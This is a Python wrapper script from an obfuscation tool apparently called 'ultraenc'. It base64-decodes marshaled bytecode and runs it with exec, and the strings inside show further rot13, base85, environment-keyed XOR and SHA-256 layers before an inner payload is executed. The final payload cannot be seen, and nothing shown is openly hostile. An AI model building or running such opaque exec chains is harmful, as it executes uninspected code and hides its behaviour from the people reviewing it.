#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """4wAAAAAAAAAAAAAAAAAAAAAIAAAAQAAAAHPgAAAAehRkAGQBbABtAVoBbQJaAgEAVwBuMgQAZQN5RgEAAQABAGQAZAJsBFoEZABkAmwFWgVkAGQCbAZaBmQAZAJsB1oHWQBuAjAAZANkBIQAWghkBWQGhABaCWQHZAiEAFoKZAlkCoQAWgtlDGUNZQ1kC5wDZAxkDYQEWg5lDWUNZQ1kDpwDZA9kEIQEWg9kG2UMZQxlDGUMZQ1kEpwFZBNkFIQFWgFlDWQVnAFkFmQXhARaAmQYWhBkGVoRZBpaEmQRWhNlAmUBZRBlEWUSZRODBIMBWhRlFWUUgwEBAGQCUwApHOkAAAAAKQLaB19kZWNvZGXaEV92ZXJpZnlfdW5tYXJzaGFsTmMBAAAAAAAAAAAAAAABAAAABAAAAEMAAABzDAAAAHQAoAF8AGQBoQJTACkCTtoGcm90XzEzKQLaBmNvZGVjc9oGZGVjb2RlKQHaAXOpAHIIAAAA+hE8dWx0cmFlbmNfcnVubmVyPtoGX3JvdDEzCAAAAHMCAAAAAAFyCgAAAGMBAAAAAAAAAAAAAAABAAAAAwAAAEMAAABzCgAAAHQAoAF8AKEBUwCpAU4pAtoGYmFzZTY02gliNjRkZWNvZGWpAdoBYnIIAAAAcggAAAByCQAAANoFX2I2NGQLAAAAcwIAAAAAAXIQAAAAYwEAAAAAAAAAAAAAAAEAAAADAAAAQwAAAHMKAAAAdACgAXwAoQFTAHILAAAAKQJyDAAAANoJYTg1ZGVjb2Rlcg4AAAByCAAAAHIIAAAAcgkAAADaBV9iODVkDgAAAHMCAAAAAAFyEgAAAGMBAAAAAAAAAAAAAAABAAAAAwAAAEMAAABzDgAAAHQAoAF8AKEBoAKhAFMAcgsAAAApA9oHaGFzaGxpYtoGc2hhMjU22gloZXhkaWdlc3RyDgAAAHIIAAAAcggAAAByCQAAANoKX3NoYTI1NmhleBEAAABzAgAAAAABchYAAAApA9oDa2V52gRzYWx02gZyZXR1cm5jAgAAAAAAAAAAAAAAAgAAAAQAAABDAAAAcxYAAAB0AKABfACgAqEAfAEXAKEBoAOhAFMAcgsAAAApBHITAAAAchQAAADaBmVuY29kZdoGZGlnZXN0KQJyFwAAAHIYAAAAcggAAAByCAAAAHIJAAAA2gRfa2RmFAAAAHMCAAAAAAFyHAAAACkD2gRkYXRhchcAAAByGQAAAGMCAAAAAAAAAAAAAAAGAAAABgAAAEMAAABzQgAAAHwBfQJ0AHQBfACDAYMBfQN0AnwAgwFEAF0gXAJ9BH0FfAV8AnwEdAF8AoMBFgAZAEEAfAN8BDwAcRh0A3wDgwFTAHILAAAAKQTaCWJ5dGVhcnJhedoDbGVu2gllbnVtZXJhdGXaBWJ5dGVzKQZyHQAAAHIXAAAA2gJrYtoDb3V02gFp2gFjcggAAAByCAAAAHIJAAAA2gRfeG9yFwAAAHMKAAAAAAEEAQwBEAEaAXImAAAA2glVTFRSQV9LRVkpBdoKcm90MTNfdGV4dNoEbW9kZdoIc2FsdF9oZXjaB2tleV9lbnZyGQAAAGMEAAAAAAAAAAAAAAAJAAAABwAAAEMAAABzZAAAAHQAfACDAX0EdAF8BKACoQCDAX0FdAN8BYMBfQZ8AWQBawJyYGQCZABsBH0HfAdqBaAGfAOhAX0IfAhzSnQHZAN8A5sAnQKDAYIBdAh8BnQJfAh0CqALfAKhAYMCgwJ9BnwGUwApBE7aA3hvcnIBAAAAehxNaXNzaW5nIGtleSBpbiBlbnZpcm9ubWVudDogKQxyCgAAAHIQAAAAchoAAAByEgAAANoCb3PaB2Vudmlyb27aA2dldNoMUnVudGltZUVycm9yciYAAAByHAAAAHIhAAAA2gdmcm9taGV4KQlyKAAAAHIpAAAAcioAAAByKwAAAFoDc3QxWgNzdDJaA3N0M3ItAAAAchcAAAByCAAAAHIIAAAAcgkAAAByAgAAAB4AAABzFAAAAAABCAEMAQgBCAEIAQwBBAEOARYBcgIAAAApAdoRcGF5bG9hZF93aXRoX2hhc2hjAQAAAAAAAAAAAAAAAwAAAAMAAABDAAAAczoAAAB8AGQBZACFAhkAoAChAH0BfABkAGQBhQIZAH0CdAF8AoMBfAFrA3IwdAJkAoMBggF0A6AEfAKhAVMAKQNOacD///91IQAAAFNIQTI1NiBtaXNtYXRjaCDigJMgZGF0YSB0YW1wZXJlZCkFcgYAAAByFgAAANoKVmFsdWVFcnJvctoHbWFyc2hhbNoFbG9hZHMpA3IyAAAAWghoZXhfaGFzaFoEYmxvYnIIAAAAcggAAAByCQAAAHIDAAAAKgAAAHMKAAAAAAEQAQwBDAEIAXIDAAAAYXwPAABuS1dQV3ljNnJhYnVWSEg1V0ZSYU0wMXVWRjArWFEwdVZGRUNaUlJnV1JnVkVQQWdNeE51Q1E5TFpIUmdZSVNZQ0o5bEFRcU9ZR01LR0hEeEFQQVVWR2ovSlFTT1lGMUVHbTFqREhqN0RGMC9LSVdSV1N0N0d4RHhMSFNERVBFZEUxVnVDUTlvQ1JSZ0ZSZ1hHd2phV0lnT0ZISHdIeGZjbjNJRURIeVNWMUFZWEpnMUhIU1dFRkFIRmx5ZXFJU09GSDRmSUhaYkFTa3BYUldQVzJwOXBHSGRIUlJoWGxXZENLUitaU1NPWXdEYm5tMWtFbUFGREY1VEEyMDlwSU44SkhTWEJTTXhGbHlqSVBiMm5JNVpYdzFrbjA1WURIYnpFMk9CQ1Brb01JRXRDdnloRUhnVEtHRDdKeGIySlRnZkJ5a3RWRklOcGxMd1YyODRJeFNGSVBnU1l3TjRZR3lQQVN5bW9SSXVMRnB4QzFjYUV2RVNMSDQyTXhTR3FJRDlWd0htb1J5Uk15RVREbFdxRjAxYUQydDdDUHFQb1FxTFlRanlZenlDV1BWM3AzSVJNeUVTWkhTSElscUpWRlJ1VkpBVEkyVmVBSE9STUtJd0V2YmNFbU1PSVNML3AwRXpaUGppRDBrQUF6OU9JUjFGV3hXZ0cwZmxER3RnV21iZURHTDVMUlI0WUZmdVgwSUpBbGtPSDNXS1oxOWhCdlp4RDAxb0tGMU5JSXRobnhON0xGQWFFRkRpS1FNU0x2cDlaeUQyWnd1ZEsyanlaMkRlRDJNVVcwUjRZRjBoRWxJVUtGY1JZbFY1QXhJd29RRU9FVExqS0d0ZUVIMVdESE10SXlnWERTTGFFemdSV21BaENSSXdvUUVPQUlrTVgxQVVXRlovWFJFWEcwVjRFeTVpSEc4dXFQQU9EeE1wWnliM1ZGeHhvSE9PQlBiaXB4TjdwUWsxRHg5RE1LQW5XUmowcFBnVFl4WjNMUUFUSVBnU0wxY09EUk11Q3dPRERJRUFwd3lOQjFFVEsyTm1FeURiRFFBUEJGY1REMkwxWkhWK0tsOWtER3FxTVVTUW5TampBSElwQlJjQUsyMUxKbHlxRlJBbnFUT1pNMTV5WDBBaVdsSUhBVVZkTEhON0RhTzFFUnlkcHZ5VlZ6SVFaSFcxSEkxSUUzTnhKUGdQRzA0d3FSdHZNSEFQRVRMakt3dUpNSk14S3ZnUUlQYmNKdkVRQlA1VFh3V09EMHFIS3h4YkVSY0tMRlNzb0lxMHB4V2VJeUh6RVA0aEFhT1JGdzFSQ3hOOHFHOTFMUUFUSVBnU0tRdVduUU9YRXlNdEV2YmJxRjlURDJMK0FSTGNIVVY2RFFBUEt3U0pNU3QvTFJEaUkzWmdFUmdGWFFTc29QV0pvSE43bzFxMEZQUzBKdkFOSXhnTG9ISXdKS1YwRHoxQUR5WjJGUERjcHdwbUUxUndCME1Cb1E0ZURGU3BHR0x1WVFNeVpSdXVHVFI2TUcxUlhHSTBwM09VQlNTaEtQNDRXeGtLbnd5YXB3RGFKSXlWQ0l5RUJtT2VGVE5tQjNXTVpGamFuUTF0Wm1qZkZQRDBCU3VxWDBWMkJ6TjVaejVwSmxnTlkyMWVBeUxrV1EwZURUODdGSUFkcUdFUUFseW5DUHl0Wm1rU25sRDZCU2NFWDBWbUJVT09IM0FESVBBTExReDJFd2tVQnY0bUwzSUFFRlJ1VjNIbUVKVmlKenhlR3dTQllIVjFYSFp3RVJXWkRSTW9Jek1NcDBXZlgzRVhaUnlwWVBiZUQyV1BHM2M2VkZSdVpscHVWRlIvWGxSdVYwT3hWRlJ5WHZidVZGUnZaUFNBRHhMYVZKVjdEMkR1WUhSMkhQV1VBeTlRVkY1MENScHVGSXVsSkZXc0EycVhWME9oWHg0eFZ4OVBMdlN5SUhjdFdTeGpKbXh3S3prc0xGSDlERjV4V0lqZElSZnVNU2thWUZWY0EzQVpXS0R2RVBidUx3Z2VXRlZjQlBTelZ2dUtWSmZ2WHg5bkx5T3FIdmdDVjBTQ0d5RHpwVUFwRmxSa0xHTmdWRjUwQnlSdVgxY3VudlJrR2FEdVcxTGZDeVp2RUl1dEtQV1Fwd01iV1B1UXBQYmJBMldER1BFTkVVRXlYU1cwSFFmYm9Ta0ZxUFJmTFJnZ1ZscDZYSlZ4SkdSZ1d2UmtHYUVuVkliYm5KdHVDUkhrV0ZSZ1dLSU9WRjFPSTNPY0ltTnlZRldIS1NJWlgwSUZNbU53REg5cUpGeVpHSTVMVkdTdVpQMHVZYUQ2SEZSZEJGOGFWRmduWFN0dkx2RUpwUFJlSnZ1TFZ6VnhJdjh1V3ZnUW9GUmVKdnRoVkZJT255NWFXeU9JTFVjNlZGUnVWRlp1VkZSdVdGUnVWRlYvVkZSdVZ3OGJLSXVDQkh1Y0h4TXRGR052RUp5SEVGOUZXMUV0RndPaVZHa05YeE9PWUZBSVlsNGpDU2MxRFFjU0sxcU9IbGtGTTBXZW5STHZFUDlDQkdXU0ZRTGZEeE10cEtFRkZQRUpadlprRTJxbUZHV3RHek1DQnZmMkEzSHdXbGZnbkhSNExtNDlWbElBQ0pXUG5sdXJXbFNob0kwaFpTa0VIUXFLQjNPbEZGUnVWRkFrV1F5S0ZSeVRFR1N6V1JFV0pKa3VWM1o3bndBUkZKNGFaMElxcVFON1ZGUmNJVGJ1VkZSdkV2a3FNRnFYRElad3AzRVJGdmNnWFJFeW5KRHVFeEF4VzJJUW5Ha3pvUkFjSzJBZ0FSRGlBSEFPSUZMakFtSG1JbUVCVkZSeUNTeVVEeWoyTFJEaEh3TWZEUWdIS2xXVEQyTVhFeE9sRlFEa1Z2V1VweVdWQXlnQkhQOUVDeUx1RXhIakZTODBKSUFZRmw4M25JMUJDUkUwcUZSMEpJQVlGdjgzbkkxcEVIV0VWRjRsTTFWaU1SSGZLSXBnRFVPbUZKNVJNdjQwSEY5SVhIRXNZMVo0cFJTUlhTRWdHeEFiQTBnaUVUSGRFSngwVkd0eEZSTjhZSEx3RXc5QklscDNIUDFIRWx5eUxHNDRFRjB2V3o0akF5OUpMRjlpQ3dOa0R6Y2VuejFUWHZ1MUF2OWhCVHA2RlF1UEFJTVRFVUg2S3dOaVdINWhFbWNnTFJFT0JQa1duUldmTUhWZ0VJajZudzlSWFRwdUV4QUJHMGZrWTFFZllScVNMbGo4V3hTQVdIRGRESVd6R1RJU0xVV2xJUXliS1BidkV4RTBZVHVTRlNPY0F4TDlEUmZ1V1BWM3AzSVBIRklqWHhNU3BGRWlEUWNCTUl5U1lGMVFCeE42R3pJTUVGMGRKMGNOQjExc1YwTjZwbDUwV1VFVFoyNVREMkwvWmw5SExtdUtESTlXQ2xrU0x5RGpWMEVWSm15d0RJWmZHVDlPSVJIY1hSTXRJdmozWTFXdEJ2cVJGMGprQkhxSlhhV1dFSHVEbkdNVEQySTFBMHFPWnY4ME1sTUtvU0x1TEdJaEd4U0ZNdjV6RXhBR3FKMWFXMEViRHhTSEVTY21FUDVHVjBNUEhJWi9CUkx3bjNaZ0UwV3BBek9SWXlWMm9STjdJUzh2RXhBekZ4TU5weHRtQjBWMEp3T2ZFeEQxR3dFUk1KeXFveE43S0lJZkRIa0ZLR3B3REhPb0kwUjNLSkh6TWxNMHBLT1REMFdYWXYxTG5RUmZEemp5WjJJUW5RSGxaME43S0lJZkRIa1JNUUQzcHg0OEl2Z1BDUmNpRUljeEQyQVRKUnhoblBSZFZJY1hFeEVlcEdmNUF4cHpNSE43TEZBYURGTURJYU9OQnlmOEtGZ1FLSGJqRXpOYkxRRVFHUmt1THhMdVh4a3hGUUVJRVRjTkIwZ2dweE5tRHlwMkVSeVdIR2ppblNNVW5IV0VIbTg0RXZBZXBsMU5CMjlqQUhNUU13eHZEd0x5RUtEaW8xT3dEbU4wRnpjT0ZRRGxGUmNPSDNIeEhIU0hHS054RHdFS0dUNDlwUmNER3hOOEN6Y2RESERoWlA1T0lGTDdFbFNWRno1SFZGUnlDU1IyQ0hNUUZHa1ZFUzlmWG05UUkyZnlIbVJ3R0hObUR6TnlFSWN6QVFwZUMwQUpvbEl2S2xMd0VUSUxYMFp2TFRIeG5SVjBLSkRhRFFnWW9LV05DUUxrWEhaK1dhVjJESUQ3bnZ1VFh2eVhZUFdTQlFid0V4SGlZVVp1VkZ1ckl4SGZvMWJrRXhIaEYyUnVWRkRrWG1xaUVUQVNCdzRnVnhONkZtU3BWbWNYQVBrQ01sTXVuR0w5cFBJTW5tcGVwS1Y1RTFnZUNQdVRFUUluWnpwYVpJa1lCSDFPQUpOaFpUU3pYbFJ1VkZWK1cwSU9YbUlTSklBRUhsUmRJU3lZRElFQU1sOVJGMFdRRGxBT292RWhFdnR6S0oxYVd5eXdYdkVjTW10Z0VJdUpwUmJ1WUY5QUZsUnVYUzV2RXZiY0VtTU9JU01MWFJWMUsxSGNEMGtBWGxNT0Z2ZzBEbFJnQkpxaVZGUnVWRlpiS0pjdUN2U0tMUThhVklxdENscHVJMk9TWEZTbFhLWmhWSXF0RHZIdnBScHpZbE13bkdwOVcwSVhJSFp5RjFTZUJQQUVuMjVTV0hnSUgyOHVWRlJ1RnZTR0h6UnZEUWpnVkprVENIUnVKdkR4QkpieERJV0hYMk9SRnZjMG5sUnVWRlYrWEc4NUxHZjlwVE1Rb3hTSEVQMXhEd0VNcVBNU0kxYjZERlJnWTNTS1ZGUnlXUkx1VkZSdld2QXBZekViRVRNSEJGcU5DUHlYR3ZSdVdGRVFWRlJ1Vnc0dm8yNUtXMEluQVVJTVZHdDNJVGNSRmxxdEMwSW5KR3VxVkYwaldJYnVWRkh4SmxSdVZGQUVWSkR6WGFWZW8ydUhEMElNb3pBSlZHdDNHenVSRjA5R0FIWnZMVE5tRXhBUFptQVNKU01qRnZSZ1kwY1hWRlJ5V1JidVZGUnZDdkhqWUhSaE1scVBNeXVSTUZmdVlSU0JNbGdqVkZSeVcxZnVWRlJ1WUZSOVkxMDNWRzBpS0c4dUNIU2NBRlI5WTJMMlZHMXpZUXh1SlJjY0FGZ2tHMkF2WjBNTEoxTmxMUnArSW1aekd4Z1VaUmdRbmxSa0UxcVNHSE9JTFRJSkRRSWFWbFZsTUdFdVZ3U3ZweWNHREgxRVgzSU5vUDVKV3hTQUNseUhEVU9rWTFWbEVTZjNWbVJnV2FWd0RHVndwRD092gVwbGFpbtoAKQFyJwAAACkWWgljeV9sb2FkZXJyAgAAAHIDAAAA2glFeGNlcHRpb25yDAAAAHIFAAAAchMAAAByNAAAAHIKAAAAchAAAAByEgAAAHIWAAAA2gNzdHJyIQAAAHIcAAAAciYAAABaB1BBWUxPQURaBE1PREVaCFNBTFRfSEVYWgdLRVlfRU5W2gRjb2Rl2gRleGVjcggAAAByCAAAAHIIAAAAcgkAAADaCDxtb2R1bGU+AwAAAHMiAAAAAgEUAQwBJgIIAwgDCAMIAxIDEgcYDA4IBAEEAQQBBAISAQ=="""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
